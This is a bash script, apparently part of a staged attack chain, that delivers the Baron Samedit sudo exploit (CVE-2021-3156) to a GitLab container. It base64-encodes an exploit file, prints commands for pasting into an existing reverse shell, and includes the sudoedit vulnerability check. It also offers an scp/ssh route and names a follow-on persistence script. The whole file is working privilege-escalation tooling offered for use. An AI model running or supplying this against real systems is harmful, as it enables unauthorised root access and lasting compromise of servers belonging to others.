#!/bin/bash
# Baron Samedit (CVE-2021-3156) privilege escalation
# Usage: Run this FROM the GitLab container as the 'git' user
# Typically: transfer exploit files to GitLab, then execute

set -e

GITLAB_HOST="${1:-172.26.0.30}"
EXPLOIT_DIR="/opt/exploits/baron-samedit"

echo "[*] Baron Samedit (CVE-2021-3156) Privilege Escalation"
echo "[*] This script transfers the exploit to GitLab and runs it"
echo ""

# Step 1: Transfer exploit to GitLab (assumes we have a shell as git user)
echo "[1/3] Transferring exploit to GitLab..."

# Copy exploit files via the existing reverse shell
# Using base64 encoding to transfer through the shell
EXPLOIT_PY=$(base64 -w0 "$EXPLOIT_DIR/exploit_nss.py")

cat <<TRANSFER_EOF
=== Run these commands in your GitLab reverse shell: ===

mkdir -p /tmp/exploit
echo "$EXPLOIT_PY" | base64 -d > /tmp/exploit/exploit_nss.py
chmod +x /tmp/exploit/exploit_nss.py

# Test if vulnerable:
sudoedit -s '\\' 2>/dev/null; echo "Exit code: \$?"
# Exit code 139 = vulnerable, 1 = patched

# Run the exploit:
cd /tmp/exploit && python3 exploit_nss.py

========================================================
TRANSFER_EOF

echo ""
echo "[2/3] Alternatively, if you have SSH access as git:"
echo "      scp $EXPLOIT_DIR/exploit_nss.py git@${GITLAB_HOST}:/tmp/"
echo "      ssh git@${GITLAB_HOST} 'python3 /tmp/exploit_nss.py'"
echo ""
echo "[3/3] After getting root, run 04-persistence.sh for persistence"
